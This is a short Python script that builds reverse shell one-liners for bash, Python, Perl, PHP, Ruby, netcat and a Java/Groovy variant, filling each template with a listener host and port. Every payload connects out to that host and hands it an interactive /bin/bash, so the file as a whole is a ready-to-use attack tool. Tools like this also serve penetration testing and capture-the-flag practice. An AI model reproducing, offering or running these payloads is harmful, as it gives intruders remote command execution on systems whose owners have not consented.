import os

payloads = {
    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1",
    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
    "perl": "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
    "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
    "nc": "nc -e /bin/bash {} {}",
    "java": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
}

def generate_payload(lhost, lport, language):
    # Check if the provided language is valid
    if language not in payloads:
        print("Invalid language. Available options are: {}".format(", ".join(payloads.keys())))
        return None 
    else:
        return payloads[language].format(lhost, lport)
    
def showPayloads():
    print("Available options are: {}".format(", ".join(payloads.keys())))